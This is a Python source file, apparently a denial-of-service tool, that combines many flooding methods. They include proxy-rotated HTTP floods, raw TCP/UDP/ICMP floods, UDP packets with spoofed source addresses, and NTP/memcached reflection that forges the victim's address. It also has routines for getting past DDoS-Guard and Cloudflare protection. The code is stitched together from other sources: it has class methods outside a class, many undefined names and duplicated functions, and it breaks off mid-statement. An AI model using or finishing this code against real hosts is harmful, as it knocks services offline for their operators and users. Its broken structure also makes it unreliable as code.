import threading
import requests
from contextlib import suppress
from requests.sessions import Session
from random import choice as randchoice
from time import sleep, time
import socket
import argparse
from random import randrange
from pathlib import Path
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import concurrent.futures
import ssl
import sys
import string
import random
from http.client import HTTPConnection
from requests_toolbelt import MultipartEncoder
import socks
import subprocess
import datetime
import httpx
import asyncio
from urllib.parse import urlparse
from scapy.all import IP, UDP, send
from random import choice as randchoice
from socket import AF_INET, SOCK_STREAM, IPPROTO_TCP, TCP_NODELAY
from math import log2, trunc
from multiprocessing import Process, Queue
from cryptography.fernet import Fernet
import json
import aiohttp
import asyncio
import ipaddress
import ntplib
from scapy.all import IP, ICMP, send

num_threads = 1000
requests_per_second = 0

num_connection_pools = 100
num_requests = 10000
ind_dict = {}
threading.stack_size(4096 * 4096)
REQUESTS_SENT = 0
BYTES_SEND = 0

MAX_PACKET_SIZE = 4096
PHI = 0xaaf219b4

Q = [0] * 4096
c = 362436
floodport = 0
limiter = 0
pps = 0
sleeptime = 100

packet_size = 0
data_size_mb = 1 

max_connections = 3000

target_port = 443  # Замініть на необхідний порт
requests_per_connection = 50  # Кількість запитів на один конект
rotation_interval = 5000  # Інтервал ротації в секундах
FIRST_RUN = True

def check_tgt(target):
    tgt = target
    try:
        ip = socket.gethostbyname(tgt)
        print("IP Address:", ip)
    except socket.gaierror:
        sys.exit("[+] Can't resolve host: Unknown host!")

    return ip



def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

def fake_ip():
    skip = '127'
    rand = [0, 0, 0, 0]
    for x in range(4):
        rand[x] = randrange(0, 256)
    if rand[0] == int(skip):
        return fake_ip()
    fkip = '%d.%d.%d.%d' % (rand[0], rand[1], rand[2], rand[3])
    return fkip

def send_request(url, method, data=None, ):
    global ind_dict
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
         
    }
    
    try:
        if method == 'GET':
            with suppress(Exception):
                with requests.get(url, headers=headers) as response:
                    pass
        elif method == 'POST':
            with suppress(Exception):
                with requests.post(url, headers=headers, data=data) as response:
                    pass
        elif method == 'HEAD':
            with suppress(Exception):
                with requests.head(url, headers=headers) as response:
                    pass
        elif method == 'HTTP-SYN':
            with suppress(Exception):
                ip = check_tgt(url)
                port = 80
                num_requests = 5000
                SOCKS = [4, 5]
                event = threading.Event()
                ind_rlock = threading.RLock()
                ind_dict = {}
                for socks_type in SOCKS:
                    ind_dict = {}
                    for proxy in proxies:
                        ind_dict[proxy.strip()] = 0
                    for i in range(num_requests):
                        threading.Thread(target=cc, args=(event, socks_type, ind_rlock)).start()
                event.set()
        elif method == 'HTTP-SYN-TPC':
            with suppress(Exception):
                ip = check_tgt(url)
                port = 80
                spam_send = 25
                booter = 1000
                size = 65500
                num_requests = 1000
                event = threading.Event()
                for i in range(num_requests):
                    threading.Thread(target=TCP_ATTACK, args=(ip, port, spam_send, booter, size)).start()
                event.set()
        elif method == 'OVH':
            with suppress(Exception):
                url_path = generate_url_path(1)
                payload = f"GET /{url_path} HTTP/1.1\r\nHost: {url}\r\nUser-Agent: OVH\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n".encode()
                ip = check_tgt(url)
                num_requests = 1000000
                for i in range(num_requests):
                    threading.Thread(target=sock_flood, args=(ip, 80, payload)).start()
        elif method == 'OVH BOT':
            with suppress(Exception):
                url_path = generate_url_path(1)
                payload = f"GET /{url_path} HTTP/1.1\r\nHost: {url}\r\nUser-Agent: OVH\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n".encode()
                ip = check_tgt(url)
                num_requests = 1000000
                for i in range(num_requests):
                    threading.Thread(target=sock_flood, args=(ip, 80, payload)).start()
                threading.Thread(target=Connection, args=(url,)).start()
        elif method == 'DGB':
            with suppress(Exception):
                DGB(url)
        elif method == 'AVB':
            with suppress(Exception):
                AVB(url)
        elif method == 'CFBUAM':
            with suppress(Exception):
                CFBUAM(url)
        elif method == 'BYPASS':
            with suppress(Exception):
                BYPASS(url)
        elif method == 'CFB':
            with suppress(Exception):
                CFB(url)
        elif method == 'uambypass':
            with suppress(Exception):
                uambypass(url)
        elif method == 'BOTNET_V1':
            with suppress(Exception):
                BOTNET_V1(url)
        elif method == 'KILLER':
            with suppress(Exception):
                KILLER(url)
        elif method == 'SLOW':
            with suppress(Exception):
                SLOW(url)
        elif method == 'XMLRPC':
            with suppress(Exception):
                XMLRPC(url)
    except Exception as e:
        print(f"Error occurred: {str(e)}")

def worker(url):
    counter = 0
    while counter < 5000:
        try:
            response = send_request(url, 'ntp_mem')
            print(response.status_code)
            counter += 1
        except requests.exceptions.RequestException as e:
            print(e)


def ovh_bypass(url, proxies=None, ):
    global REQUESTS_SENT, BYTES_SEND
    pro = None
    if proxies:
        pro = randchoice(proxies)
    s = None
    with suppress(Exception), Session() as s:
        for _ in range(566556):
            if pro:
                with s.get(url, proxies=pro.asRequest()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)
                    continue

            with s.get(url) as res:
                REQUESTS_SENT += 1
                BYTES_SEND += len(res.content)




pps, cps = 0, 0

async def ttt(event, payload, url, rpc):
    global cps, pps
    while True:
        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3
        reader, writer = await asyncio.open_connection(url.hostname, url.port or 443, ssl=context)
        await event.wait()
        cps += 1
        for _ in range(rpc):
            writer.write(payload)
            await writer.drain()
            pps += 1

async def dns_flood(target, num_requests=200000, debug=False):
    url = urllib.parse.urlsplit(target)
    rpc = 200000
    timer = 10  # Время атаки в секундах

    event = asyncio.Event()
    event.clear()
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {url.hostname}\r\n"
        f"\r\n"
    ).encode('latin-1')

    async def main(url, rpc):
        nonlocal event, payload
        event.clear()

        for _ in range(num_requests):
            asyncio.create_task(ttt(event, payload, url, rpc))
            await asyncio.sleep(.0)

        event.set()
        print("Attack Started")

    async def logger():
        global cps, pps
        nonlocal timer

        while timer > 0:
            timer -= 1
            await asyncio.sleep(1)
            print("PPS: %d CPS: %d" % (pps, cps))
            pps, cps = 0, 0

    asyncio.run(main(url, rpc))
    asyncio.run(logger())


def ntp_mem(event, socks_type, ind_rlock, num_threads):
    global ind_dict

    if socks_type == "ntp_mem":
        ntp_packets = randrange(10, 150)
        ntp_server = choice(ntpsv)
        mem_packets = randrange(1024, 60000)
        mem_server = choice(memsv)
        max_requests = 800000
        request_counter = 0
        delay_seconds = 5
        dst_port = 11211
        initial_requests = 5000

        event.wait()
        while True:
            try:
                try:
                    ntp_packet = (
                        IP(dst=ntp_server, src=target)
                        / UDP(sport=randrange(1, 65535), dport=int(port))
                        / Raw(load=ntp_payload)
                    )
                    for _ in range(multiple):
                        send(ntp_packet, count=ntp_packets, verbose=False)

                    mem_packet = (
                        IP(dst=mem_server, src=target)
                        / TCP(dport=dst_port, sport=RandShort())
                        / Raw(load=mem_payload)
                    )
                    for _ in range(initial_requests):
                        send(mem_packet, count=mem_packets, verbose=False)
                        request_counter += 1
                        if request_counter % 5 == 0:
                            print(f"Requests: {request_counter}. Delay: {delay_seconds} seconds.")
                            sleep(delay_seconds)
                except:
                    pass
            except:
                pass

    elif socks_type == "bypass":
        proxy = choice(proxies).strip().split(":")
        event.wait()
        payload = str(random._urandom(64))
        while True:
            try:
                s = requests.Session()
                if socks_type == 5 or socks_type == 4:
                    s.proxies["http"] = (
                        "socks{}://".format(socks_type)
                        + str(proxy[0])
                        + ":"
                        + str(proxy[1])
                    )
                    s.proxies["https"] = (
                        "socks{}://".format(socks_type)
                        + str(proxy[0])
                        + ":"
                        + str(proxy[1])
                    )
                if socks_type == 1:
                    s.proxies["http"] = "http://" + str(proxy[0]) + ":" + str(proxy[1])
                    s.proxies["https"] = "https://" + str(proxy[0]) + ":" + str(proxy[1])
                if protocol == "https":
                    s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
                try:
                    for _ in range(multiple):
                        s.post(sys.argv[2], timeout=1, data=payload)
                    ind_rlock.acquire()
                    ind_dict[(proxy[0] + ":" + proxy[1]).strip()] += multiple + 1
                    ind_rlock.release()
                except:
                    s.close()
            except:
                s.close()

    elif socks_type == "TLS":
        header = GenReqHeader("get")
        proxy = choice(proxies).strip().split(":")
        add = "?"
        if "?" in path:
            add = "&"
        event.wait()
        while True:
            try:
                s = socks.socksocket()
                if socks_type == 4:
                    s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
                if socks_type == 5:
                    s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                if brute:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((str(target), int(port)))
                if protocol == "https":
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                    s = ctx.wrap_socket(s, server_hostname=target)
                else:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                    s = ctx.wrap_socket(s, server_hostname=target)

                try:
                    for n in range(multiple + 1):
                        get_host = (
                            "GET "
                            + path
                            + add
                            + randomurl()
                            + " HTTP/1.1\r\nHost: "
                            + target
                            + "\r\n"
                        )
                        request = get_host + header
                        sent = s.send(str.encode(request))

                        if not sent:
                            ind_rlock.acquire()
                            ind_dict[(proxy[0] + ":" + proxy[1]).strip()] += n
                            ind_rlock.release()
                            proxy = choice(proxies).strip().split(":")
                            break
                    s.close()
                except:
                    s.close()
                ind_rlock.acquire()
                ind_dict[(proxy[0] + ":" + proxy[1]).strip()] += multiple + 1
                ind_rlock.release()
            except:
                s.close()

def sock_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) if attack == "udp" else socket.socket(socket.AF_INET,
                                                                                               socket.SOCK_STREAM)
    s.connect((target, port))
    while True:
        try:
            if attack == "tcp":
                s.send(random._urandom(random.randint(1, 120)))
            else:
                s.send(random._urandom(65) * 1000)
            if isKilled():
                break
            if delay:
                time.sleep(delay)
        except (socket.error, BrokenPipeError, Exception) as err:
            if not isKilled():
                if debug:
                    print("[" + yl + "!" + wi + "] " + yl + f"{attack.upper()}-ATTACK:" + wi +
                          " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi,
                          end='\r')
            else:
                break
            if hasattr(err, 'errno'):
                if err.errno == 24:
                    break
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) if attack == "udp" else socket.socket(socket.AF_INET,
                                                                                                       socket.SOCK_STREAM)
            if attack == "tcp":
                s.connect((target, port))
        if isKilled():
            break


def DGB(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(50):
                with ss.get(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)


def AVB(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(10000):
                payload = generate_payload()
                with ss.open(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)





    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False



def open_connection(self, host=None) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock


def network_attack(until_datetime, target, req, spam_send, booter, size):
    global stop_command
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)  # Set a timeout for socket operations

        if target['scheme'] == 'https':
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.connect((str(target['host']), int(target['port'])))
            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
        else:
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.connect((str(target['host']), int(target['port'])))

        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            for _ in range(50000):
                packet.sendall(req.encode())

        s.connect((target['ip'], target['port']))

        for _ in range(booter):
            if stop_command:
                break
            for _ in range(spam_send):
                if stop_command:
                    break
                s.sendall(os.urandom(size))
                s.send(os.urandom(size))

    except Exception as e:
        print("An error occurred:", e)
    finally:
        packet.close()
        s.close()

def CFBUAM(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            payload = generate_payload()
            with ss.open(url) as res:
                REQUESTS_SENT += 1
                BYTES_SEND += len(res.content)
            sleep(5.01)
            ts = time()
            while time() < ts + 120:
                with ss.open(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)
                sleep(1)


def BYPASS(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(50):
                pro = None
                if self._proxies:
                    pro = randchoice(self._proxies)
                if pro:
                    with ss.get(url, proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                else:
                    with ss.get(url) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

def CFB(url):
    global REQUESTS_SENT, BYTES_SEND
    pro = None
    if self._proxies:
        pro = randchoice(self._proxies)
    with create_scraper() as s:
        for _ in range(self._rpc * 10000):
            if pro:
                with s.get(self._target.human_repr(), proxies=pro.as_request()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.size_of_request(res)
                    continue

        with s.get(self._target.human_repr()) as res:
            REQUESTS_SENT += 1
            BYTES_SEND += Tools.size_of_request(res)
        Tools.safe_close(s)

def uambypass(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(10000):
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                    "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1"
                    
                }
                with ss.get(url, headers=headers) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)


async def BOT_V1(url, method='GET', num_requests=50000):
    http_methods = ["POST ", "GET ", "PUT ", "DELETE ", "PATCH ", "OPTIONS ", "icmp_flood"]
    useragents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    ]

    pps, cps = 0, 0

    def generate_request(url):
        return (
            f"GET {url.path or '/'} HTTP/1.1\r\n"
            f"Host: {url.hostname}\r\n"
            f"\r\n"
        ).encode('latin-1')

    async def icmp_flood(url, port, repeat):
        try:
            dstIP = socket.gethostbyname(url)
        except socket.gaierror:
            print("Error: Invalid URL")
            return
        
        for x in range(repeat):
            IP_Packet = IP()
            IP_Packet.dst = dstIP
            ICMP_Packet = ICMP()
            send(IP_Packet/ICMP_Packet, verbose=False)
            await asyncio.sleep(0.01)  # Non-blocking sleep

    async def connect(session, url, rpc, request_interval):
        nonlocal cps, pps
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)  # Use TLS 1.3
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3
        
        async with session.get(url.geturl(), ssl=context) as response:
            cps += 1
            for _ in range(rpc):
                await response.read()
                pps += 1
                await asyncio.sleep(request_interval)

    async def main():
        nonlocal pps, cps
        parsed_url = urllib.parse.urlsplit(url)
        rpc = num_requests
        min_desired_bandwidth_mbps = 1000  # Set to a higher value to utilize maximum speed
        max_desired_bandwidth_mbps = 10000
        request_size_bytes = len(generate_request(parsed_url))
        
        # Calculate interval based on desired bandwidth within the range
        min_request_interval = request_size_bytes * 3002 / (max_desired_bandwidth_mbps * 100000)
        max_request_interval = request_size_bytes * 3002 / (min_desired_bandwidth_mbps * 100000)
        random.seed()  # Seed random number generator
        request_interval = random.uniform(min_request_interval, max_request_interval)
        
        async with aiohttp.ClientSession() as session:
            tasks = [connect(session, parsed_url, rpc, request_interval) for _ in range(int(num_requests))]
            await asyncio.gather(*tasks)

    asyncio.run(main())


def BOTNET_V1(url):
    global REQUESTS_SENT, BYTES_SENT
    with suppress(Exception):
        with requests.Session() as ss:
            for _ in range(5000):
                # Perform custom requests or tests here
                # Example:
                with ss.get(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SENT += len(res.content)
                    if REQUESTS_SENT >= 5000:
                        break

def Connection(url):
    BOT_V1(url, method='GET', num_requests=5000)

def socks_cflow(secs, target, methods):
    global stop_command
    url_path = generate_url_path(1)
    payload = f"{methods} /{url_path} HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: type\r\nOrigin: type\r\nReferrer: type\r\n{spoof(target['host'])}\r\n".replace('type',"".join(random.sample(str(string.ascii_lowercase), int(4)))).encode()
    try:
        if target['scheme'] == 'https':
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
            packet.settimeout(65536)
            packet.connect((str(target['host']), int(target['port'])))
            packet.connect_ex((str(target['host']), int(target['port'])))
            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
        else:
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
            packet.settimeout(65536)
            packet.connect((str(target['host']), int(target['port'])))
            packet.connect_ex((str(target['host']), int(target['port'])))

        while time.time() < secs:
            if stop_command:
                break
            for _ in range(10000):
                if stop_command:
                    break
                packet.send(payload)
                packet.sendall(payload)
    except:
        try:
            packet.close()
            pass
        except:
            pass

def TCP_ATTACK(ip,port,spam_send,booter,size):
    global stop_command
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        s.connect_ex((ip,port))
        for _ in range(booter):
            if stop_command:
                break
            for _ in range(spam_send):
                if stop_command:
                    break
                s.sendall(os.urandom(size))
                s.send(os.urandom(size))
    except:
        pass

def CFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(50000):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass

def ICMPFlood(url, port, repeat):
    try:
        dstIP = socket.gethostbyname(url)
    except socket.gaierror:
        print("Error: Invalid URL")
        return
    
    for x in range(repeat):
        IP_Packet = IP()
        IP_Packet.dst = dstIP
        ICMP_Packet = ICMP()
        send(IP_Packet/ICMP_Packet, verbose=False)

def cc(event, socks_type, ind_rlock):
    global ind_dict
    header = GenReqHeader("get")
    proxy = choice(proxies).strip().split(":")
    add = "?"
    if "?" in path:
        add = "&"
    event.wait()
    while True:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for n in range(multiple + 1):
                    get_host = (
                        "GET "
                        + path
                        + add
                        + randomurl()
                        + " HTTP/1.1\r\nHost: "
                        + target
                        + "\r\n"
                    )
                    request = get_host + header
                    sent = s.send(str.encode(request))
                    if not sent:
                        ind_rlock.acquire()
                        ind_dict[(proxy[0] + ":" + proxy[1]).strip()] += n
                        ind_rlock.release()
                        proxy = choice(proxies).strip().split(":")
                        break
                s.close()
            except:
                s.close()
            ind_rlock.acquire()
            ind_dict[(proxy[0] + ":" + proxy[1]).strip()] += multiple + 1
            ind_rlock.release()
        except:
            s.close()

pps, cps = 0, 0

async def ttt(event, payload, url, rpc):
    global cps, pps
    while True:
        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3
        reader, writer = await asyncio.open_connection(url.hostname, url.port or 443, ssl=context)
        await event.wait()
        cps += 1
        for _ in range(rpc):
            writer.write(payload)
            await writer.drain()
            pps += 1

async def http_flood(target, num_requests=200000, debug=False, use_https=False):
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{target}/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }

    connections = 200000
    rpc = 200000
    timer = 10  # Время атаки в секундах

    event = asyncio.Event()
    event.clear()
    payload = (
        f"GET {url.path or '/'} HTTP/1.1\r\n"
        f"Host: {url.hostname}\r\n"
        f"\r\n"
    ).encode('latin-1')

    async def main(url, connections, rpc):
        nonlocal event, payload
        event.clear()

        for _ in range(connections):
            asyncio.create_task(ttt(event, payload, url, rpc))
            await asyncio.sleep(.0)

        event.set()
        print("Attack Started")

    async def logger():
        global cps, pps
        nonlocal timer

        while timer > 0:
            timer -= 1
            await asyncio.sleep(1)
            print("PPS: %d CPS: %d" % (pps, cps))
            pps, cps = 0, 0

    async def ttt_wrapper():
        url = urllib.parse.urlsplit(sys.argv[1])
        event = asyncio.Event()
        event.clear()
        payload = (
            f"GET {url.path or '/'} HTTP/1.1\r\n"
            f"Host: {url.hostname}\r\n"
            f"\r\n"
        ).encode('latin-1')
        rpc = int(sys.argv[3])

        for _ in range(int(sys.argv[2])):
            asyncio.create_task(ttt(event, payload, url, rpc))
            await asyncio.sleep(.0)

        global cps, pps
        timer = int(sys.argv[4])

        while timer > 0:
            timer -= 1
            await asyncio.sleep(1)
            print("PPS: %d CPS: %d" % (pps, cps))
            pps, cps = 0, 0

    asyncio.run(ttt_wrapper())
    asyncio.run(logger())

    with suppress(Exception):
        for _ in range(min(rpc, 5)):
            with requests.get(url, headers=headers) as response:
                pass

def udp_flood(url, port, message, dur):
    # Parse the URL to get the hostname
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname

    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set a timeout for the socket so that the program doesn't get stuck
    s.settimeout(dur)

    # The IP address and port number of the target host
    target = (hostname, port)

    # Start sending packets
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message.encode(), target)
            packet_count += 1
            print(f"Sent packet {packet_count}")
        except socket.error:
            # If the socket is not able to send the packet, break the loop
            break

        # If the specified duration has passed, break the loop
        if time.time() - start_time >= dur:
            break

    # Close the socket
    s.close()

def UDPFlood(url, port, repeat):
    data = "A" * 1250
    try:
        dstIP = socket.gethostbyname(url)
    except socket.gaierror:
        print("Error: Invalid URL")
        return
    
    for x in range(repeat):
        IP_Packet = IP()
        IP_Packet.src = randomSrcIP()
        IP_Packet.dst = dstIP

        UDP_Packet = UDP()
        UDP_Packet.dport = port
        send(IP_Packet/UDP_Packet/Raw(load=data), verbose=False)

def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: keep-alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)




def attackSKY(url, timer, threads):
    socksCrawler()
    prox = open("./socks5.txt", 'r').read().split('\n')
    user_agent = random.choice(useragents)
    req_template = "GET {} HTTP/1.1\r\nHost: {}\r\nCache-Control: no-cache\r\n"
    req_template += "{}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req_template += "Sec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\n"
    req_template += "Sec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nConnection: Keep-Alive\r\n\r\n"

    for _ in range(int(threads)):
        proxy = random.choice(prox).strip().split(":")
        timelol = time.time() + int(timer)
        while time.time() < timelol:
            try:
                s = socks.socksocket()
                s.connect((str(urlparse(url).netloc), int(443)))
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
                request = req_template.format(url, urlparse(url).netloc, user_agent)
                s.send(str.encode(request))
                try:
                    for i in range(200):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()


def NULL(self, num_threads=10) -> None:
    global REQUESTS_SENT, BYTES_SENT, FIRST_RUN

    def send_requests():
        payload: Any = str.encode(self._payload +
